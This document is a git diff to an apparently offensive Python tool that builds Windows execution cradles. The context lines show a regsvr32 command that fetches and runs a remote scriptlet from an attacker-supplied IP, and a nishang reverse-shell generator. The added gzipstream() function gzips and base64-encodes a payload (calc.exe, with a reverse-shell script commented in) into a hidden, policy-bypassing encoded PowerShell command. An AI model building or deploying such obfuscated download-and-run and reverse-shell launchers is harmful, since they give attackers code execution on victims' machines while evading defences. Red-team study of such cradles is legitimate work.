@@ -1,5 +1,6 @@
 #!python3
-import argparse, base64, os, random, string
+import argparse, base64, os, random, string,gzip 
+from io import StringIO
 # Red - Important information
 # Yellow - Notice me, eventually
 # Green - Use me, abuse me, try to lose me
@@ -172,8 +173,23 @@ def regsvr32():
 	execution_cradle_command = 'regsvr32 /s /n /u /i:http://%s:%s/%s scrobj.dll' % (ipaddr,web_delivery,random_sct_filename)
 	register_cradle('regsvr32',shell_name,random_sct_filename, regsvr_cradle_scriptlet,execution_cradle_command) # filename, shellcontent,execution_cradle. 
 
+def gzipstream():
+	shell_name = 'Invoke-PowerShellTcp.ps1' # payload i want to execute
+	shell_file = resource_directory+shell_name # path to said payload
+	# code_to_execute = open(shell_file).read()
+	code_to_execute = 'calc.exe'
+	out = StringIO()
+	data = bytes(code_to_execute, 'utf-8')
+	out = gzip.compress(data)
+	gzipdata = base64.b64encode(out).decode("utf-8")
+	b64gzip = "IEX(New-Object IO.StreamReader((New-Object System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('%s'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
+	encodedPayload = base64.b64encode(b64gzip.encode('UTF-16LE')).decode("utf-8")
+	execution_cradle_command = "powershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % encodedPayload
+	register_cradle('gzipstream','shell_name','random_sct_filename', 'regsvr_cradle_scriptlet',execution_cradle_command) # filename, shellcontent,execution_cradle. 
+
 def cradles():
 	regsvr32()
+	gzipstream()
 
 def shells():
 	nishang_powershell_reverse() # create and show 
